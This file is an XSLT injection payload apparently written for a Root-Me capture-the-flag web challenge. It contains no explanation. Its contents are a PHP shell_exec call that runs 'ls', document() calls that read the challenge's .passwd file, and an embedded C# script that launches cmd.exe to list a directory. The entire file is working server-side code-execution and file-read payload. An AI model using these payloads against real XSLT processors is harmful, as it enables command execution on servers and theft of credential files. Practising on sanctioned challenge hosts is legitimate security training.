<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;color:red;background-color:#000000">
    <span style="font-weight:bold"><xsl:value-of select="name"/> - </span>
    <p>
        <xsl:value-of select="system-property('xsl:vendor')"/>
	<xsl:value-of select="php:function('shell_exec', 'ls')" />
	<xsl:copy-of select="document('http://challenge01.root-me.org/web-serveur/ch50/.passwd')"/>
	<xsl:value-of select="document('http://challenge01.root-me.org/web-serveur/ch50/.passwd')"/>
	<msxsl:script language = "C#" implements-prefix = "user">
<![CDATA[
public string execute(){
System.Diagnostics.Process proc = new System.Diagnostics.Process();
proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe";
proc.StartInfo.RedirectStandardOutput = true;
proc.StartInfo.UseShellExecute = false;
proc.StartInfo.Arguments = "/c dir";
proc.Start();
proc.WaitForExit();
return proc.StandardOutput.ReadToEnd();
}
]]>
</msxsl:script>
    </p>
</body>
</html> 
